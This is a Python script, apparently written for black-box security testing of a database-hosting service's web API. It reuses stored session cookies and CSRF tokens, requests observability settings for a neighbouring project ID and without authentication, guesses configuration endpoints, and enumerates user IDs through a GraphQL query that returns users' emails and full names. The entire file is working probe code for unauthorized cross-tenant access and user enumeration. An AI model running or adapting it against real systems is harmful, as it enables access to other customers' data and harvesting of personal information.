# -*- coding: utf-8 -*-
"""observability 黑盒探测:
1. GET /ajax-api/2.0/postgres/projects/{pid}/observability-settings (A 项目, 带/不带 cookie)
2. observability configs 列表端点候选
3. GraphQL richUser 查询(id 枚举候选)
全部零破坏
"""
import http.client, ssl, json, re, html, sys, os, time

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

PID = 'orange-sun-90493739'

def ctl_req(method, path, body=None, with_cookie=True):
    try:
        fresh = {}
        csrf = None
        if with_cookie:
            conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
            conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
            r = conn.getresponse(); r.read()
            for sc in r.headers.get_all('Set-Cookie') or []:
                m = re.match(r'([^=]+)=([^;]*)', sc)
                if m: fresh[m.group(1)] = m.group(2)
            conn.close()
            conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
            conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
            r2 = conn2.getresponse(); txt = r2.read().decode('utf-8', 'replace'); conn2.close()
            m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
            csrf = html.unescape(m.group(1)) if m else None
        parts = []
        if with_cookie:
            for c in cookie_str().split(';'):
                c = c.strip()
                if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
                    parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
                else:
                    parts.append(c)
        conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
        hdrs = {'User-Agent': 'Mozilla/5.0'}
        if with_cookie:
            hdrs['Cookie'] = '; '.join(parts)
        hdrs.update(HEADERS_TEST)
        if body is not None:
            hdrs['Content-Type'] = 'application/json'
        if csrf:
            hdrs['X-CSRF-Token'] = csrf
        if not with_cookie:
            hdrs = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
        conn3.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=hdrs)
        r3 = conn3.getresponse()
        out = r3.read().decode('utf-8', 'ignore')
        conn3.close()
        return r3.status, out
    except Exception as e:
        return -1, 'EXC %s' % e

print('=== 1. observability-settings ===', flush=True)
for pid in [PID, 'does-not-exist-xyz', 'orange-sun-90493738']:
    st, raw = ctl_req('GET', API_BASE + '/ajax-api/2.0/postgres/projects/%s/observability-settings' % pid)
    print('[%s] -> %d %s' % (pid, st, raw[:300].replace('\n', ' ')), flush=True)
    time.sleep(0.3)
st, raw = ctl_req('GET', API_BASE + '/ajax-api/2.0/postgres/projects/%s/observability-settings' % PID, with_cookie=False)
print('[noauth] -> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)

print('\n=== 2. configs 列表候选 ===', flush=True)
cands = ['/ajax-api/2.0/observability/configs',
         '/ajax-api/2.0/postgres/observability/configs',
         '/ajax-api/2.0/postgres/configs',
         '/ajax-api/2.0/observability/configurations',
         '/ajax-api/2.0/postgres/projects/%s/observability/configs' % PID,
         '/ajax-api/2.0/postgres/projects/%s/observability-configurations' % PID]
for p in cands:
    st, raw = ctl_req('GET', API_BASE + p)
    print('[%s] -> %d %s' % (p.replace(API_BASE, ''), st, raw[:180].replace('\n', ' ')), flush=True)
    time.sleep(0.2)

print('\n=== 3. GraphQL richUser ===', flush=True)
q = 'query UserById($id: Long!) @component(name: "DBSQLX.FileBrowser") { richUser(userId: $id) { email fullname } }'
for gpath in ['/graphql', '/api/graphql', '/ajax-api/2.0/graphql', '/ajax-api/2.0/postgres/graphql']:
    for vid in [1, 2, 100, 1276718]:
        st, raw = ctl_req('POST', API_BASE + gpath,
                          {'query': q, 'variables': {'id': vid}})
        print('[%s id=%d] -> %d %s' % (gpath, vid, st, raw[:200].replace('\n', ' ')), flush=True)
        time.sleep(0.15)
